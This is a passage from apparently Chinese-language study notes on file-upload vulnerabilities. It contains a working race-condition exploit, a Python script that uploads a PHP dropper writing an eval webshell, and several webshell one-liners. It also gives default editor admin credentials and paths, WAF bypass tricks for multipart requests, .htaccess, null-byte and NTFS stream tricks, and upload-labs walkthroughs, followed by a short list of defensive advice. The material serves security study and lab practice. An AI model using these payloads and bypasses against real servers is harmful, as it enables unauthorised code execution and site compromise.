class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"error:not an upload file！"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$newfile = $path.$filename;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"file upload success.file path is: "</span>.$newfile.<span class="string">"\n&lt;br /&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_FILES[<span class="string">'file'</span>][<span class="string">'error'</span>]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    unlink($newfile);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Upload file error: "</span>);</span><br><span class="line">&#125;</span><br><span class="line">$ext = array_pop(explode(<span class="string">"."</span>,$_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]));</span><br><span class="line"><span class="keyword">if</span>(!in_array($ext,$allowtype))&#123;</span><br><span class="line">    unlink($newfile);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"error:upload the file type is not allowed，delete the file！"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>首先将文件上传到服务器，然后检测文件后缀名，如果不符合条件，就删掉，我们的利用思路是这样的，首先上传一个php文件，内容为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">"./info.php"</span>, <span class="string">"w"</span>), <span class="string">'&lt;?php @eval($_POST["drops"]) ?&gt;'</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>​    当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。利用代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RaceCondition</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.url = <span class="string">"http://127.0.0.1:8080/upload/shell0.php"</span></span><br><span class="line">        self.uploadUrl = <span class="string">"http://127.0.0.1:8080/upload/copy.php"</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_get</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'try to call uploaded file...'</span>)</span><br><span class="line">        r = requests.get(self.url)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">            print(<span class="string">"[*]create file info.php success"</span>)</span><br><span class="line">            os._exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_upload</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"upload file....."</span>)</span><br><span class="line">        file = &#123;<span class="string">"file"</span>:open(<span class="string">"shell0.php"</span>,<span class="string">"r"</span>)&#125;</span><br><span class="line">        requests.post(self.uploadUrl, files=file)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">                self._get()</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">                self._upload()</span><br><span class="line">                self._get()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    threads = <span class="number">20</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threads):</span><br><span class="line">        t = RaceCondition()</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threads):</span><br><span class="line">        t.join()</span><br></pre></td></tr></table></figure>

<p>经过几次尝试后成功成功写入shell</p>
<p><img src="https://images.seebug.org/content/images/2018/04/e0906f72-9da9-403c-a942-ba3771a931e0.png-w331s" alt="img"></p>
<h4 id="针对各种CMS"><a href="#针对各种CMS" class="headerlink" title="针对各种CMS"></a>针对各种CMS</h4><p>比如说JCMS等存在的漏洞，可以针对不同CMS存在的上传漏洞进行绕过。</p>
<ul>
<li>PHPCMSv9.6.0任意文件上传</li>
</ul>
<h5 id="针对各种编辑器漏洞"><a href="#针对各种编辑器漏洞" class="headerlink" title="针对各种编辑器漏洞"></a>针对各种编辑器漏洞</h5><p>比如FCK，ewebeditor等，可以针对编辑器的漏洞进行绕过。</p>
<h5 id="文本编辑器"><a href="#文本编辑器" class="headerlink" title="文本编辑器"></a>文本编辑器</h5><p>常见的文本编辑器有CKEditor、eWebEditor、UEditor、KindEditor、xhEditor等，它们的功能类似且都有图片上传、视频上传、远程下载等功能，这类文本编辑器也称为富文本编辑器。</p>
<h5 id="1-FCKeditor"><a href="#1-FCKeditor" class="headerlink" title="1 FCKeditor"></a>1 FCKeditor</h5><p>下面以FCKeditor(现名为CKEditor)为例：</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、敏感信息暴漏</span><br><span class="line">    * 查看版本信息</span><br><span class="line">        <span class="regexp">/FCKeditor/</span>editor<span class="regexp">/dialog/</span>fck_about.html</span><br><span class="line">    * 默认上传页面</span><br><span class="line">        <span class="regexp">/FCKeditor/</span>editor<span class="regexp">/filemanager/</span>browser<span class="regexp">/default/</span>browser.html</span><br><span class="line">        <span class="regexp">/FCKeditor/</span>editor<span class="regexp">/filemanager/</span>browser<span class="regexp">/default/</span>connectors/test.html</span><br><span class="line">        <span class="regexp">/FCKeditor/</span>editor<span class="regexp">/filemanager/</span>upload/test.html</span><br><span class="line">        <span class="regexp">/FCKeditor/</span>editor<span class="regexp">/filemanager/</span>connectors/test.html</span><br><span class="line">        <span class="regexp">/FCKeditor/</span>editor<span class="regexp">/filemanager/</span>connectors/uploadtest.html</span><br><span class="line">    * 其他敏感文件</span><br><span class="line">        <span class="regexp">/FCKeditor/</span>editor<span class="regexp">/filemanager/</span>connectors<span class="regexp">/aspx/</span>connector.html</span><br><span class="line">        <span class="regexp">/FCKeditor/</span>editor<span class="regexp">/filemanager/</span>connectors<span class="regexp">/asp/</span>connector.html</span><br><span class="line">        <span class="regexp">/FCKeditor/</span>editor<span class="regexp">/filemanager/</span>connectors<span class="regexp">/php/</span>connector.php</span><br><span class="line"><span class="number">2</span>、黑名单策略错误</span><br><span class="line">    FCKeditor&lt;=<span class="number">2.4</span><span class="number">.3</span>版本采用的是有弊端的黑名单策略，可以采用asa、cer等扩展名</span><br><span class="line"><span class="number">3</span>、任意文件上传漏洞</span><br><span class="line">    FCKeditor的<span class="number">2.4</span><span class="number">.2</span>及以下本本的黑名单配置信息里没有定义类型Media，直接构造html表单就行，</span><br><span class="line">在form中的action=<span class="string">"http://22.22.22.22/fckeditor/editor/filemanager/upload/php/upload.php?Type=Media"</span> 即可，然后上传</span><br></pre></td></tr></table></figure>

<h5 id="2-eWebEditor"><a href="#2-eWebEditor" class="headerlink" title="2 eWebEditor"></a>2 eWebEditor</h5><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、默认后台</span><br><span class="line">    <span class="number">2.80</span>以前为：ewebeditor/admin_login.asp</span><br><span class="line">    <span class="number">2.80</span>以后为：admin/login.asp</span><br><span class="line"><span class="number">2</span>、默认账号密码</span><br><span class="line">    admin   admin888</span><br><span class="line"><span class="number">3</span>、数据库地址</span><br><span class="line">    默认数据库地址</span><br><span class="line">    ewebeditor/db/ewebeditor.mdb</span><br><span class="line">    常用数据库地址</span><br><span class="line">    ewebeditor/db/ewebeditor.asa</span><br><span class="line">    ewebeditor/db/ewebeditor.asa</span><br><span class="line">    ewebeditor/db/<span class="selector-id">#ewebeditor</span>.asa</span><br><span class="line">    ewebeditor/db/<span class="selector-id">#ewebeditor</span>.mdb</span><br><span class="line">    ewebeditor/db/!@<span class="selector-id">#ewebeditor</span>.asp</span><br><span class="line">    ewebeditor/db/ewebeditor1033.mdb</span><br><span class="line">    asp asa为后缀的数据库下载下来后改为mdb</span><br></pre></td></tr></table></figure>

<h4 id="针对各种WAF"><a href="#针对各种WAF" class="headerlink" title="针对各种WAF"></a>针对各种WAF</h4><h5 id="1-垃圾数据"><a href="#1-垃圾数据" class="headerlink" title="1 垃圾数据"></a>1 垃圾数据</h5><p>有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。此种情况可以构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验；</p>
<p><img src="https://images.seebug.org/content/images/2018/04/a7ae783e-9275-4e41-9c70-c899396fb012.png-w331s" alt="img"></p>
<p>当然也可以将垃圾数据放在数据包最开头，这样便可以绕过对文件名的校验。</p>
<p><img src="https://images.seebug.org/content/images/2018/04/cd2f1355-be07-4c63-a802-0aa991bf2197.png-w331s" alt="img"></p>
<p>可以将垃圾数据加上Content-Disposition参数后面，参数内容过长，可能会导致waf检测出错。</p>
<h5 id="2-filename"><a href="#2-filename" class="headerlink" title="2 filename"></a>2 filename</h5><p>针对早期版本安全狗，可以多加一个filename</p>
<p><img src="https://images.seebug.org/content/images/2018/04/0bd2ce6f-25e0-4f59-b004-957ff71b1fd9.png-w331s" alt="img"></p>
<p>或者将filename换位置，在IIS6.0下如果我们换一种书写方式，把filename放在其他地方：</p>
<p><img src="https://images.seebug.org/content/images/2018/04/d86eaa81-9a84-40dc-9347-6c5bfdbfeaf6.png-w331s" alt="img"></p>
<h5 id="3-POST-GET"><a href="#3-POST-GET" class="headerlink" title="3 POST/GET"></a>3 POST/GET</h5><p>有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。 此种情况可以上传一个POST型的数据包，抓包将POST改为GET。</p>
<h5 id="4-以上方式"><a href="#4-以上方式" class="headerlink" title="4 以上方式"></a>4 以上方式</h5><p>针对WAF，以上介绍的服务器解析漏洞、文件包含漏洞等都可以尝试绕过。</p>
<p>**</p>
<h5 id="5-利用waf本身缺陷"><a href="#5-利用waf本身缺陷" class="headerlink" title="5 利用waf本身缺陷"></a>5 利用waf本身缺陷</h5><h6 id="删除实体里面的Conten-Type字段"><a href="#删除实体里面的Conten-Type字段" class="headerlink" title="删除实体里面的Conten-Type字段"></a>删除实体里面的Conten-Type字段</h6><p><img src="https://images.seebug.org/content/images/2018/04/f7b360e4-e055-43b7-ae94-b98419256476.png-w331s" alt="img"></p>
<p>第一种是删除Content整行，第二种是删除C后面的字符。删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">正常包：Content-Disposition: form-data; name="image"; filename="085733uykwusqcs8vw8wky.png"Content-Type: image/png</span><br><span class="line">构造包：Content-Disposition: form-data; name="image"; filename="085733uykwusqcs8vw8wky.png</span><br><span class="line">C.php"</span><br></pre></td></tr></table></figure>

<h6 id="删除Content-Disposition字段里的空格"><a href="#删除Content-Disposition字段里的空格" class="headerlink" title="删除Content-Disposition字段里的空格"></a>删除Content-Disposition字段里的空格</h6><p><img src="https://images.seebug.org/content/images/2018/04/1ca10020-3739-4def-b0e1-f4b004a1f196.png-w331s" alt="img"></p>
<p>增加一个空格导致安全狗被绕过案列： Content-Type: multipart/form-data; boundary=—————————4714631421141173021852555099 尝试在boundary后面加个空格或者其他可被正常处理的字符： boundary= —————————47146314211411730218525550</p>
<h6 id="修改Content-Disposition字段值的大小写"><a href="#修改Content-Disposition字段值的大小写" class="headerlink" title="修改Content-Disposition字段值的大小写"></a>修改Content-Disposition字段值的大小写</h6><p><img src="https://images.seebug.org/content/images/2018/04/ae0437ec-b9f5-48db-a28f-75408445c23f.png-w331s" alt="img"></p>
<h6 id="Boundary边界不一致"><a href="#Boundary边界不一致" class="headerlink" title="Boundary边界不一致"></a>Boundary边界不一致</h6><p>每次文件上传时的Boundary边界都是一致的：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">Content-<span class="keyword">Type</span>: multipart/form-data; boundary=<span class="comment">---------------------------4714631421141173021852555099</span></span><br><span class="line">Content-Length: <span class="number">253</span></span><br><span class="line"><span class="comment">-----------------------------4714631421141173021852555099</span></span><br><span class="line">Content-Disposition: form-data; <span class="type">name</span>="file1"; filename="shell.asp"</span><br><span class="line">Content-<span class="keyword">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;%eval request("a")%&gt;</span><br><span class="line"><span class="comment">-----------------------------4714631421141173021852555099--</span></span><br></pre></td></tr></table></figure>

<p>但如果容器在处理的过程中并没有严格要求一致的话可能会导致一个问题，两段Boundary不一致使得waf认为这段数据是无意义的，可是容器并没有那么严谨： Win2k3 + IIS6.0 + ASP</p>
<p><img src="https://images.seebug.org/content/images/2018/04/c4f02267-e336-41c1-9423-3c86fa81856b.png-w331s" alt="img"></p>
<h6 id="文件名处回车"><a href="#文件名处回车" class="headerlink" title="文件名处回车"></a>文件名处回车</h6><p><img src="https://images.seebug.org/content/images/2018/04/80c9d74a-d9bc-411c-af2a-a704eb5e1aff.png-w331s" alt="img"></p>
<h6 id="多个Content-Disposition"><a href="#多个Content-Disposition" class="headerlink" title="多个Content-Disposition"></a>多个Content-Disposition</h6><p>在IIS的环境下，上传文件时如果存在多个Content-Disposition的话，IIS会取第一个Content-Disposition中的值作为接收参数，而如果waf只是取最后一个的话便会被绕过，Win2k8 + IIS7.0 + PHP</p>
<p><img src="https://images.seebug.org/content/images/2018/04/6b945737-c4b4-4350-a5ba-972b35b09fda.png-w331s" alt="img"></p>
<h5 id="利用NTFS-ADS特性"><a href="#利用NTFS-ADS特性" class="headerlink" title="利用NTFS ADS特性"></a>利用NTFS ADS特性</h5><p>ADS是NTFS磁盘格式的一个特性，用于NTFS交换数据流。在上传文件时，如果waf对请求正文的filename匹配不当的话可能会导致绕过。</p>
<p><img src="https://images.seebug.org/content/images/2018/04/b3625731-9f1d-4889-8609-b357b61a2368.png-w331s" alt="img"></p>
<h5 id="文件重命名绕过"><a href="#文件重命名绕过" class="headerlink" title="文件重命名绕过"></a>文件重命名绕过</h5><p>如果web程序会将filename除了扩展名的那段重命名的话，那么还可以构造更多的点、符号等等。</p>
<p><img src="https://images.seebug.org/content/images/2018/04/95eabfd7-54b0-4f0f-971f-2316423fac33.png-w331s" alt="img"></p>
<h5 id="特殊的长文件名绕过"><a href="#特殊的长文件名绕过" class="headerlink" title="特殊的长文件名绕过"></a>特殊的长文件名绕过</h5><p>文件名使用非字母数字，比如中文等最大程度的拉长，不行的话再结合一下其他的特性进行测试：</p>
<p>shell.asp;王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王.jpg</p>
<h5 id="反删除"><a href="#反删除" class="headerlink" title="反删除"></a>反删除</h5><p>将下图file1改成了file4，这样就不会把这个文件删除了。（JCMS漏洞）</p>
<p><img src="https://images.seebug.org/content/images/2018/04/389b0352-5ba1-4d7c-8d77-198dab060856.png-w331s" alt="img"></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">条件： 寻找一个上传点，查看上传点是否可用。</span><br><span class="line"></span><br><span class="line">利用：</span><br><span class="line"></span><br><span class="line">首先判断是程序员自己写的上传点，还是编辑器的上传功能</span><br><span class="line"></span><br><span class="line">如果是编辑器上传功能，goolge当前编辑器的漏洞</span><br><span class="line"></span><br><span class="line">如果是程序员写的上传点</span><br><span class="line"></span><br><span class="line">上传一个正常的jpg图片 查看上传点是否可用</span><br><span class="line"></span><br><span class="line">上传一个正常的jpg图片，burp拦截，修改后缀为php (可以检测前端验证 MIME检测 文件内容检测 后缀检测）</span><br><span class="line"></span><br><span class="line">上传一个正常的jpg图片，burp拦截， 00截断 1.php%00.jpg</span><br><span class="line"></span><br><span class="line">判断服务器是什么类型，web服务器程序，是什么类型，版本号多少</span><br><span class="line"></span><br><span class="line">利用解析漏洞</span><br></pre></td></tr></table></figure>

<h4 id="防护建议"><a href="#防护建议" class="headerlink" title="防护建议"></a>防护建议</h4><ol>
<li>使用白名单限制可以上传的文件扩展（白名单比黑名单可靠多了）</li>
<li>验证文件内容，使用正则匹配恶意代码限制上传</li>
<li>对上传后的文件统一随机命名，不允许用户控制扩展名</li>
<li>修复服务器可能存在的解析漏洞</li>
<li>严格限制可以修改服务器配置的文件上传如：.htaccess</li>
<li>隐藏上传文件路径。</li>
<li>升级Web Server</li>
<li>及时修复Web上传代码（重要）</li>
<li>不能有本地文件包含漏洞</li>
<li>注意0x00截断攻击（PHP更新到最新版本）</li>
<li>上传文件的存储目录禁用执行权限</li>
</ol>
<h3 id="文件上传漏洞的主要利用和绕过方式总结。"><a href="#文件上传漏洞的主要利用和绕过方式总结。" class="headerlink" title="文件上传漏洞的主要利用和绕过方式总结。"></a>文件上传漏洞的主要利用和绕过方式总结。</h3><p><strong>1.前端JS绕过</strong></p>
<p>基于本地验证文件是否符合要求：直接将<strong>JavaScript</strong>禁用。或者burp抓包后修改后缀，将php文件后缀现先改为jpg，burp抓包后后缀改回php。</p>
<p><strong>2.MIME 类型验证</strong></p>
<p>burp抓包将<strong>Content-type</strong>类型修改为image/jpeg，image/png等</p>
<p><strong>3.黑名单验证</strong></p>
<p>1.寻找没有过滤的类型：phtml php3 php4 php5  PHP phtml</p>
<p>2.大小写绕过：例如Php</p>
<p><strong>4.文件内容验证</strong></p>
<p>1<strong>.getimagesize()函数获取图像信息</strong>：通过构造图片马进行绕过。</p>
<p>2.<strong>文件头绕过</strong>：例如 GIF89a <?php phpinfo(); ?></p>
<p>2.<strong>检验关键字</strong>&lt;?php:利用script标签绕过：<code>&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;hack&#39;]);&lt;/script&gt;</code></p>
<p><strong>6. .htaccess上传</strong></p>
<p>上传的.jpg文件都会以php格式解析</p>
<p>.htaccess内容</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">AddType   <span class="built_in">application</span>/x-httpd-php     .jpg</span><br></pre></td></tr></table></figure>

<p>这里代码的意思可以让 .jpg后缀名文件格式的文件名以php格式解析，因此达到了可执行的效果。所以我们可以把要上传的php文件的后缀名改为.jpg格式从而绕过</p>
<p><strong>7.00截断绕过</strong></p>
<p>php.   jpg  将空格二进制20改为00；</p>
<p><strong>8.win系统解析漏洞绕过</strong></p>
<p>1.上传1.php(或者图片马)，抓包修改为1.php.</p>
<p>2.上传1.php(或者图片马)，抓包修改为1.php::$DATA</p>
<p>3.上传1.php(或者图片马)，抓包修改为1.php:1.jpg</p>
<p>4.上传1.php(或者图片马)，抓包修改为1.php::$DATA…….</p>
<p><strong>9.文件包含绕过</strong>：首先上传图片木马shell.jpg，然后上传可以进行文件包含的php文件,比如上传1.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$x=$_GET[<span class="string">'x'</span>];</span><br><span class="line"><span class="keyword">include</span>($x);</span><br></pre></td></tr></table></figure>

<p>然后我们访问1.php?x=shell.jpg即可。</p>
<p><strong>10.条件竞争绕过</strong></p>
<p>通过BURP不断发包，导致不断写入webshell,再写入速度频率上超过安全软件查杀频率，导致绕过。</p>
<p><strong>11.二次渲染绕过</strong></p>
<p>上传图片加载后，会对图片进行二次渲养，改变大部分图片源码，绕过为：对照上传后的图片与原图片放在winhex中对不，查看图片哪个数据块没有被改变。将木马代码放在没有改变的一块中，在不损坏图片的前提下，即可绕过上传</p>
<p><strong>12.中间件解析漏洞</strong></p>
<p>apache：上传图片马，抓包修改为1.php.xxxx.abc</p>
<p>iis6.0 6.5：上传图片马，抓包修改猴嘴为.asa、.cer和.cdx等。</p>
<p>​                    上传图片马，抓包修改为1.asp;.jpg或者%00 /00也可以</p>
<p>​                    上传图片马，抓包发现有保存图片的路径，如../upload/image</p>
<p>nginx: 上传图片马，拿到图片马的路径，访问的时候加上/.php 就可作为php文件解析,如         </p>
<p>​            upload/image/1.jpg/.php</p>
<p>tomcat:弱口令进入后台，上传war包即可，shell.jsp–&gt;shell.zip–&gt;shell.war</p>
<h3 id="靶场：upload-labs-实战总结"><a href="#靶场：upload-labs-实战总结" class="headerlink" title="靶场：upload-labs 实战总结"></a>靶场：upload-labs 实战总结</h3><p><strong>upolad-labs考察知识点汇总：</strong></p>
<img src="/2020/04/03/wen-jian-shang-chuan-lou-dong-xue-xi-bi-ji/11525934-e19630249b9b8764.png">



<p>​    upload-labs是一个使用php语言编写的，专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场。旨在帮助大家对上传漏洞有一个全面的了解。目前一共20关，每一关都包含着不同上传方式。</p>
<h5 id="Pass-01-前端js检测"><a href="#Pass-01-前端js检测" class="headerlink" title="Pass-01-前端js检测"></a>Pass-01-前端js检测</h5><p><strong>考察知识点：</strong>前端js检测，我们可以选择禁用js,或者直接burp直接抓包绕过.。</p>
<p><img src="/2020/04/03/wen-jian-shang-chuan-lou-dong-xue-xi-bi-ji/QQ%E6%88%AA%E5%9B%BE20200115201219.png" alt></p>
<h5 id="Pass-02-只检测Content-type"><a href="#Pass-02-只检测Content-type" class="headerlink" title="Pass-02 只检测Content-type"></a>Pass-02 只检测Content-type</h5><p><strong>考察知识点：</strong>Content-Type绕过，我们直接改为 image/jpeg</p>
<p><img src="/2020/04/03/wen-jian-shang-chuan-lou-dong-xue-xi-bi-ji/QQ%E6%88%AA%E5%9B%BE20200115201548.png" alt></p>
<h5 id="Pass-03-黑名单绕过"><a href="#Pass-03-黑名单绕过" class="headerlink" title="Pass-03 黑名单绕过"></a>Pass-03 黑名单绕过</h5><p><strong>考察知识点：</strong>黑名单绕过，禁止上传.asp|.aspx|.php|.jsp后缀文件，但是我们可以上传.php3 .phtml .php5另类后缀名。</p>
<h5 id="Pass-04-htaccess绕过"><a href="#Pass-04-htaccess绕过" class="headerlink" title="Pass-04  .htaccess绕过"></a>Pass-04  .htaccess绕过</h5><p><strong>考察知识点：</strong>构造.htaccess文件，内容为<code>AddType  application/x-httpd-php  .jpg</code></p>
<p>我们首先上传.htaccess文件，</p>
<img src="/2020/04/03/wen-jian-shang-chuan-lou-dong-xue-xi-bi-ji/QQ截图20200124121848.png" style="zoom: 80%;">



<p>然后上传我们事先准备好的php文件将后缀改为.jpg文件,</p>
<img src="/2020/04/03/wen-jian-shang-chuan-lou-dong-xue-xi-bi-ji/QQ截图20200124122245.png" style="zoom:150%;">

<p>可以在本地看到成功上传。</p>
<h5 id="Pass-05-大小写绕过"><a href="#Pass-05-大小写绕过" class="headerlink" title="Pass-05 大小写绕过"></a>Pass-05 大小写绕过</h5><p><strong>考察知识点：</strong>因为此次黑名单过滤了.htaccess，但是没有将文件名转换为小写。所以我们可以通过大小写绕过。</p>
<img src="/2020/04/03/wen-jian-shang-chuan-lou-dong-xue-xi-bi-ji/QQ截图20200124124135.png" style="zoom: 80%;">



<h5 id="Pass-06-空格绕过"><a href="#Pass-06-空格绕过" class="headerlink" title="Pass-06 空格绕过"></a>Pass-06 空格绕过</h5><p><strong>考察知识点</strong>：修改文件后缀为<code>1.php空格</code>.,利用.php[空格]绕过黑名单，然后利用windows的文件命名规则默认除去空格,达到上传.php的目的</p>
<p><img src="/2020/04/03/wen-jian-shang-chuan-lou-dong-xue-xi-bi-ji/QQ%E6%88%AA%E5%9B%BE20200124124135.png" alt></p>
<h5 id="Pass-07-点绕过"><a href="#Pass-07-点绕过" class="headerlink" title="Pass-07 点绕过"></a>Pass-07 点绕过</h5><p><strong>考察知识点：</strong>wIndow命名规则:window下 xx.php空格xx.php.不允许存在，系统会默认去除空格或点。此处过滤了空格，但是没有过滤点。我们用burp将文件后缀改为php.即可。</p>
<img src="/2020/04/03/wen-jian-shang-chuan-lou-dong-xue-xi-bi-ji/QQ截图20200124130943.png" style="zoom:150%;">



<h5 id="Pass-08-DATA绕过"><a href="#Pass-08-DATA绕过" class="headerlink" title="Pass-08  ::$DATA绕过"></a>Pass-08  ::$DATA绕过</h5><p><strong>考察知识点</strong>：$DATA绕过：在php+windows的情况下：如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名。</p>
<p>所以：文件后缀改为：<code>xx.php::$DATA</code>即可</p>
<p><img src="/2020/04/03/wen-jian-shang-chuan-lou-dong-xue-xi-bi-ji/QQ%E6%88%AA%E5%9B%BE20200115202909.png" alt></p>
<h5 id="Pass-09-点空格点绕过"><a href="#Pass-09-点空格点绕过" class="headerlink" title="Pass-09 点空格点绕过"></a>Pass-09 点空格点绕过</h5><p>这里我们分析一下源代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里其实已经过滤的很严格了。</p>
<p>依次进行了严格的黑名单过滤、转换大小写、去除文件名尾的空格和点。还去除了;$DATA.</p>
<p>但是这里存在很明显的代码逻辑漏洞：代码<strong>去点，除空</strong>的操作只进行了一次。那么我们把后缀名改为</p>
<p><strong>php. .</strong> 点 空格点的格式。最后的后缀名为<strong>.php.</strong> 成功绕过。</p>
<p><img src="/2020/04/03/wen-jian-shang-chuan-lou-dong-xue-xi-bi-ji/QQ%E6%88%AA%E5%9B%BE20200115204443.png" alt></p>
<h5 id="Pass-10-双写绕过"><a href="#Pass-10-双写绕过" class="headerlink" title="Pass-10 双写绕过"></a>Pass-10 双写绕过</h5><p>考察知识点:双写绕过，这里利用了<code>str_irepalce</code>函数将不符合上传的后缀名替换为空，且该函数对 大小写不敏感，我们可以通过双写后缀名 .pphphp进行绕过。</p>
<p><img src="/2020/04/03/wen-jian-shang-chuan-lou-dong-xue-xi-bi-ji/QQ%E6%88%AA%E5%9B%BE20200115205208.png" alt></p>
